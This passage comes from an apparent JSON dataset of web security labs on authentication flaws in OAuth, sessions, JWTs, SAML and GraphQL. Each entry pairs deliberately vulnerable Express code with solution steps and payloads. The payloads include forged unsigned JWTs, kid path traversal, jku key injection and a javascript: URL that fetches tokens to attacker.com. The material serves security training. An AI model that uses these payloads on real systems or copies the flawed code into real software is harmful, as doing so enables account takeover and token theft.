        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectURIs = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const url = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth-provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
        "payloads": [
          "https://vulnerableapp.com/auth?redirect_uri=https://attacker.com/callback",
          "OAuth URL with modified redirect: attacker.com/capture?token=xyz",
          "Access token used in: Authorization: Bearer <token>"
        ]
      },
      {
        "Lab scenario": "Session Fixation vulnerability in login flow",
        "Lab Description": "The login process does not regenerate session identifiers after authentication. The application issues a session cookie before login, and the same session is reused post-authentication. This allows an attacker to fixate a session ID and trick a user into authenticating with it. To solve: hijack Carlos's session using a fixed session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and note the issued session cookie.",
          "2. Send this fixed session ID to Carlos via phishing or CSRF bait.",
          "3. Wait for Carlos to log in using the fixated session (simulate login as Carlos with that session ID).",
          "4. Reuse the same session ID in your own browser and access /my-account.",
          "5. Confirm you're logged in as Carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send('Welcome, ' + req.session.username); res.status(401).send('Not logged in'); }); app.listen(4000);",
        "payloads": [
          "Set-Cookie: connect.sid=sessid123456",
          "Phishing URL using fixed session: http://example.com/login?session=sessid123456",
          "Reuse same session cookie after victim logs in"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in authentication header",
        "Lab Description": "The application uses JWTs for authentication, but fails to verify the token signature when the algorithm is set to 'none'. This allows attackers to forge a valid token without needing the secret key. To solve: forge a token with 'none' algorithm to impersonate Carlos and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in with any user and intercept the Authorization: Bearer <token> header using Burp Suite.",
          "2. Decode the JWT at jwt.io and inspect its header and payload.",
          "3. Modify the header to { \"alg\": \"none\" } and payload to { \"username\": \"carlos\" }, then base64 encode both without a signature.",
          "4. Replace the original token in Burp with the forged one.",
          "5. Send a GET /my-account request with the modified token and confirm access to Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username) req.user = decoded; next(); }); app.get('/my-account', (req, res) => { if (req.user?.username === 'carlos') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "JWT payload: {\"username\":\"carlos\"}",
          "Forged token: base64url(header).base64url(payload). (no signature)"
        ]
      },
      {
        "Lab scenario": "Open redirect vulnerability in OAuth callback endpoint",
        "Lab Description": "The OAuth flow accepts arbitrary redirect_uri values without strict validation. This allows attackers to capture tokens or force victim logins on attacker-controlled domains. To solve: craft a redirect_uri that steals Carlos's OAuth token and gain access to his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to initiate an OAuth login request to /auth?client_id=123&redirect_uri=http://attacker.com/callback.",
          "2. Modify redirect_uri to a domain under your control and complete the OAuth flow.",
          "3. Wait for Carlos to click a phishing link or be redirected.",
          "4. Capture the token from your controlled domain’s server logs.",
          "5. Use the captured token to craft a GET /my-account request with Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokenStore = { 'carlos': 'abcd.efgh.ijkl' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = tokenStore['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer abcd.efgh.ijkl') return res.send('Welcome Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "http://attacker.com/callback#access_token=abcd.efgh.ijkl",
          "Malicious OAuth link: /auth?client_id=123&redirect_uri=http://evil.com/callback",
          "Authorization: Bearer abcd.efgh.ijkl"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass via 'none' algorithm in token validation logic",
        "Lab Description": "The application uses JWTs for session management but fails to properly verify the token's signature. Specifically, it accepts tokens with the 'none' algorithm without validating their integrity. This flaw allows attackers to forge tokens and impersonate other users. To solve: Forge a JWT for the 'admin' user and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request containing a JWT after logging in.",
          "Decode the JWT using jwt.io or a similar tool to analyze its header and payload.",
          "Modify the header to set 'alg' to 'none' and change the payload's 'username' to 'admin'.",
          "Remove the signature part of the token, leaving only the header and payload.",
          "Replace the original JWT in the intercepted request with the forged token and resend the request to access the admin panel."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.use(express.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }];\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const user = users.find(u => u.username === username);\n  if (!user) return res.status(401).send('Invalid user');\n  const token = jwt.sign({ username: user.username, role: user.role }, 'secret');\n  res.json({ token });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload?.role !== 'admin') return res.status(403).send('Access denied');\n  res.send('Welcome to the admin panel');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth 2.0 misconfiguration in redirect URI validation",
        "Lab Description": "The application integrates with a third-party OAuth provider for authentication. However, it fails to properly validate the 'redirect_uri' parameter during the OAuth flow, allowing attackers to manipulate it and capture authorization codes meant for other users. To solve: Exploit the misconfiguration to obtain an access token for the 'admin' user and access the admin dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth authorization request and identify the 'redirect_uri' parameter.",
          "Modify the 'redirect_uri' to point to an attacker-controlled domain that captures authorization codes.",
          "Send a phishing link to the 'admin' user, tricking them into initiating the OAuth flow.",
          "Capture the authorization code from the redirected request to the attacker's domain.",
          "Exchange the captured authorization code for an access token and use it to access the admin dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\napp.get('/auth', (req, res) => {\n  const redirectUri = req.query.redirect_uri;\n  const authUrl = `https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=${redirectUri}`;\n  res.redirect(authUrl);\n});\n\napp.get('/callback', (req, res) => {\n  const code = req.query.code;\n  request.post('https://oauth.provider.com/token', {\n    form: {\n      grant_type: 'authorization_code',\n      code: code,\n      redirect_uri: 'https://app.com/callback',\n      client_id: 'client123',\n      client_secret: 'secret'\n    }\n  }, (error, response, body) => {\n    const accessToken = JSON.parse(body).access_token;\n    res.send(`Access token: ${accessToken}`);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback",
          "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://malicious.site/steal"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session IDs in session management",
        "Lab Description": "The application assigns session IDs in a predictable manner and does not regenerate them upon user login. This flaw allows attackers to set a known session ID for a victim and hijack their session after they log in. To solve: Set a known session ID, trick the victim into logging in, and use the same session ID to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to initiate a session with a specific session ID by setting the 'session_id' cookie.",
          "Send the session link with the fixed session ID to the victim, prompting them to log in.",
          "After the victim logs in, use the same session ID to access their account.",
          "Verify access by navigating to the user's dashboard or profile page.",
          "Log out and clear cookies to end the session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\nconst sessions = {};\n\napp.get('/login', (req, res) => {\n  const sessionId = req.cookies.session_id || 'guest';\n  sessions[sessionId] = { loggedIn: true, user: 'victim' };\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const session = sessions[sessionId];\n  if (session && session.loggedIn) {\n    res.send(`Welcome, ${session.user}`);\n  } else {\n    res.send('Please log in');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "Set-Cookie: session_id=knownsessionid123",
          "Set-Cookie: session_id=attackersession456"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid user request containing JWT using Burp Suite",
            "Decode the JWT in JWT Editor to analyze structure and claims",
            "Modify the alg header to 'none' and remove the signature section",
            "Add custom 'role':'admin' claim to the payload",
            "Submit the modified token to /admin endpoint and verify privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
        ]
    },
    {
        "Lab scenario": "GraphQL query batching attack in user enumeration",
        "Lab Description": "The GraphQL endpoint processes batched queries sequentially without rate limiting. The application leaks timing differences in error responses. To solve: identify valid usernames through differential response analysis using batched authentication attempts.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture normal login attempt with OWASP ZAP",
            "Craft batched GraphQL query with 100 username variations",
            "Analyze response timing differences using Burp Suite's Compare feature",
            "Identify usernames with distinct response characteristics",
            "Perform targeted password spraying against identified accounts"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      if(username === 'admin') {\n        return password === 'secret123';\n      }\n      return false;\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
        "payloads": [
            "[{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user1\",\"password\":\"pass\"}}},{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user2\",\"password\":\"pass\"}}}]",
            "{\"query\":\"query { first: login(username: \\\"admin\\\", password: \\\"guess1\\\") second: login(username: \\\"test\\\", password: \\\"guess2\\\") }\"}",
            "{\"query\":\"mutation { logins: batchLogin(inputs: [{username: \\\"carlos\\\", password: \\\"test\\\"}, {username: \\\"admin\\\", password: \\\"test\\\"}]) }\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
        "Lab Description": "The OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to attacker-controlled domains. To solve: intercept the OAuth flow and redirect the authorization code to your exploit server.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow with Postman using attacker-controlled redirect_uri",
            "Intercept authorization request with Burp Suite and modify redirect_uri",
            "Capture authorization code from callback URL",
            "Exchange code for access token at OAuth token endpoint",
            "Use stolen token to authenticate as victim user"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = { 'client123': { secret: 'sec123', redirectUris: ['https://legit.com/callback'] } };\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substr(2,8);\n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'ACCESS_TOKEN_' + code });\n  } else {\n    res.status(401).send('Invalid client');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback&state=123",
            "https://oauth-victim.com/authorize?response_type=token&client_id=client123&redirect_uri=http://localhost:9999&scope=all",
            "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://legit.com/callback.attacker.com&state=xyz"
        ]
    },
    {
        "Lab scenario": "Session fixation via pre-set Session-ID in OAuth callback",
        "Lab Description": "The OAuth implementation sets predictable session IDs before authentication. The application maintains the same session after privilege elevation. To solve: fixate a session ID before authentication and reuse it post-OAuth flow to gain admin access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept OAuth initiation request with Burp Suite and note session cookie",
            "Manually set this session cookie in browser before authentication",
            "Complete OAuth flow with a low-privilege test account",
            "Modify the callback request to include admin claim",
            "Reuse original session cookie to access admin dashboard"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({\n  secret: 'weaksecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\napp.get('/oauth-callback', (req, res) => {\n  req.session.user = req.query.user;\n  req.session.role = req.query.role || 'user';\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  if(req.session.role === 'admin') {\n    res.send('Admin panel');\n  } else {\n    res.send('User dashboard');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "/oauth-callback?user=attacker&role=admin",
            "/oauth-callback?user=admin&__proto__.role=admin",
            "/oauth-callback?user=carlos&role=admin&override=1"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification uses kid header to load keys from filesystem without proper sanitization. The application's debug endpoint leaks key paths. To solve: craft a JWT with kid pointing to known public key file and sign with corresponding private key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover /debug endpoint revealing key storage location using OWASP ZAP",
            "Extract default public key path from debug information",
            "Craft JWT with kid header pointing to /etc/passwd",
            "Identify valid key path via error message differences",
            "Generate valid token using found key path and access admin API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/debug', (req, res) => {\n  res.json({ keyPath: '/var/keys/app_rsa.pub' });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  const keyPath = decoded.header.kid || '/var/keys/app_rsa.pub';\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key);\n    res.send('Valid token');\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIva2V5cy9hcHBfcnNhLnB1YiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.NsZXBhc3N3ZA",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ob21lL3VzZXIvLnNzaC9pZF9yc2EucHViIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.KJHGFDSA"
        ]
    },
    {
        "Lab scenario": "MFA bypass through state parameter manipulation in SAML flow",
        "Lab Description": "The SAML implementation improperly validates state parameters during MFA initiation. The application skips MFA when receiving crafted state values. To solve: intercept SAML response and modify state parameter to known bypass value.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture normal SAML authentication flow using Burp Suite",
            "Identify state parameter in MFA initiation request",
            "Replay request with state=bypass in Postman",
            "Observe successful authentication without MFA prompt",
            "Modify SAML response to target admin user"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst sessions = {};\napp.post('/saml/acs', (req, res) => {\n  const { SAMLResponse, RelayState } = req.body;\n  if(RelayState === 'bypass_mfa') {\n    sessions[req.ip] = { user: req.body.user, mfa: true };\n    res.redirect('/admin');\n  } else {\n    res.redirect('/mfa');\n  }\n});\napp.get('/admin', (req, res) => {\n  if(sessions[req.ip]?.mfa) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=bypass_mfa&user=admin",
            "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjxyZWxheVN0YXRlPmJ5cGFzc19tZmE8L3JlbGF5U3RhdGU%2BPC9zYW1scDpSZXNwb25zZT4%3D",
            "SAMLResponse=valid_response&RelayState=bypass_mfa&user=carlos&mfa=0"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys. The application doesn't restrict allowed domains for key URLs. To solve: host a malicious public key and craft a JWT pointing to it with admin claims.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT with Burp Suite and analyze structure",
            "Set up attacker-controlled server hosting crafted public key",
            "Modify JWT header to include jku pointing to malicious key",
            "Add admin claims and sign with corresponding private key",
            "Submit forged token to /admin endpoint for privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  let key;\n  if (decoded.header.jku) {\n    key = (await axios.get(decoded.header.jku)).data;\n  } else {\n    key = process.env.DEFAULT_KEY;\n  }\n  try {\n    jwt.verify(token, key);\n    res.json({ access: decoded.payload.role === 'admin' ? 'granted' : 'denied' });\n  } catch (e) {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20va2V5LnB1YiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.SIGNADURA",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9tYWxpY2lvdXMta2V5In0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9.U2lnbmVk",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC5leGFtcGxlL2tleS5qc29uIn0.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.S1lNVEhFUkU"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through open redirect in mobile client",
        "Lab Description": "The mobile OAuth flow fails to validate redirect URIs properly when handling deep links. The application leaks access tokens to arbitrary domains via 302 redirects. To solve: chain an open redirect with the OAuth callback to intercept the token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Identify mobile deep link handler (/mobile-auth) with OWASP ZAP",
            "Find open redirect vulnerability in /redirect endpoint",
            "Craft malicious URL chaining redirect with OAuth callback",
            "Lure victim to click link (simulated in lab)",
            "Capture access token from attacker-controlled server logs"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = {};\napp.get('/mobile-auth', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const token = 'tok_' + Math.random().toString(36).substr(2);\n  tokens[token] = { client_id, user: 'mobile_user' };\n  res.redirect(`${redirect_uri}?token=${token}`);\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.get('/oauth-callback', (req, res) => {\n  if (tokens[req.query.token]) {\n    res.send('Authenticated');\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "/mobile-auth?client_id=trusted_app&redirect_uri=/redirect?url=https://attacker.com",
            "/mobile-auth?client_id=mobile_client&redirect_uri=/redirect%3Furl%3Dhttp://evil.com/steal",
            "/mobile-auth?client_id=legit&redirect_uri=javascript:fetch('https://attacker.com/?token='+document.location.search)"
        ]
    },
    {
        "Lab scenario": "Session hijacking through WebSocket authentication bypass",
        "Lab Description": "The WebSocket upgrade request reuses HTTP session cookies without revalidation. The application maintains WebSocket connections after session expiration. To solve: hijack active WebSocket connection by replaying captured cookie during upgrade.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture WebSocket handshake with Burp Suite",
            "Note session cookie in Connection: Upgrade request",
            "Allow victim to authenticate and establish WebSocket",
            "Replay handshake with captured cookie during victim's active session",
            "Intercept and modify privileged WebSocket messages"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const cookies = require('cookie').parse(req.headers.cookie || '');\n  if (sessions[cookies.session]) {\n    ws.user = sessions[cookies.session];\n    ws.send(`Welcome back ${ws.user}`);\n  } else {\n    ws.close(1008, 'Invalid session');\n  }\n});\napp.post('/login', (req, res) => {\n  sessions[Math.random().toString(36)] = req.body.user;\n  res.send('Logged in');\n});",
        "payloads": [
            "GET /chat HTTP/1.1\r\nHost: victim.com\r\nCookie: session=stolen_session_id\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
            "{\"user\":\"attacker\",\"session\":\"valid_session_id\"}",
            "ws://victim.com/ws?session=highjacked_session"
        ]
    },
    {
        "Lab scenario": "JWT claim injection via nested JSON parsing flaw",
        "Lab Description": "The JWT verification improperly handles nested JSON structures in claims. The application's deep object merging overwrites security controls. To solve: inject admin privileges through crafted nested claims in a valid JWT.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture valid JWT using Burp Suite and decode structure",
            "Identify claim merging behavior through fuzzing with Postman",
            "Craft nested JSON structure with conflicting admin claim",
            "Sign modified token using leaked debug endpoint credentials",
            "Submit to /admin-api endpoint and verify privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst deepmerge = require('deepmerge');\nconst app = express();\nconst DEFAULT_CLAIMS = { user: 'guest', roles: ['public'] };\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.verify(token, process.env.SECRET);\n    const claims = deepmerge(DEFAULT_CLAIMS, decoded);\n    if (claims.roles.includes('admin')) {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZXMiOlsidXNlciJdLCJfX3Byb3RvX18iOnsicm9sZXMiOlsicHVibGljIiwiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGFpbXMiOnsicm9sZXMiOlsidXNlciJdfSwiY2xhaW1zIjp7InJvbGVzIjpbImFkbWluIl19fQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlcyI6WyJwdWJsaWMiXSwiX2NvbnRleHQiOnsicm9sZXMiOlsiYWRtaW4iXX19.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        ]
    },
    {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "The OAuth token exchange endpoint is vulnerable to HTTP parameter pollution. The application uses the first token parameter while logging the last. To solve: swap tokens during the exchange flow to gain elevated privileges.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept OAuth token exchange with Burp Suite",
            "Identify duplicate token parameters in POST body",
            "Craft request with attacker token first and victim token last",
            "Verify token mismatch in server logs via debug endpoint",
            "Use swapped token to access privileged resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\napp.post('/token', (req, res) => {\n  const token = Array.isArray(req.body.token) ? req.body.token[0] : req.body.token;\n  console.log('Token used:', req.body.token);\n  if (tokens[token]) {\n    res.json(tokens[token]);\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "token=admin_token&token=user_token",
            "token[]=admin_token&token[]=user_token",
            "token=attacker_token&access_token=victim_token&token=admin_token"
        ]
    },
    {
        "Lab scenario": "Session fixation through GraphQL batch query caching",
        "Lab Description": "The GraphQL endpoint caches session tokens improperly when processing batch queries. The application reuses the first valid session for subsequent operations. To solve: fixate session through batch query and hijack victim's authenticated state.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover GraphQL batch endpoint using OWASP ZAP",
            "Capture valid session token from test account",
            "Craft batch query mixing session operations",
            "Verify session inheritance through debug logs",
            "Execute privileged mutations with hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst app = express();\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    setSession(token: String): String\n    adminAction: String\n  }\n`);\nlet currentSession = null;\nconst root = {\n  getSession: () => currentSession,\n  setSession: ({token}) => {\n    currentSession = token;\n    return 'Session set';\n  },\n  adminAction: () => {\n    return currentSession === 'admin_token' ? 'Success' : 'Denied';\n  }\n};\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\napp.listen(3000);",
        "payloads": [
            "[{\"query\":\"mutation {setSession(token: \\\"attacker_token\\\")}\"},{\"query\":\"mutation {setSession(token: \\\"victim_token\\\")}\"},{\"query\":\"mutation {adminAction}\"}]",
            "{\"query\":\"mutation {first: setSession(token: \\\"admin_token\\\") second: adminAction}\"}",
            "[{\"query\":\"mutation {setSession(token: \\\"fixed_session\\\")}\"},{\"query\":\"mutation {adminAction}\"}]"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion via leaked debug endpoint",
        "Lab Description": "The application exposes a debug endpoint that leaks the public key used for JWT verification. The JWT implementation is vulnerable to algorithm confusion attacks. To solve: obtain the public key, craft an HS256-signed token with admin claims, and bypass authentication.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Discover /debug endpoint using OWASP ZAP directory brute-forcing",
            "Extract public key from debug response",
            "Modify JWT header to use HS256 algorithm",
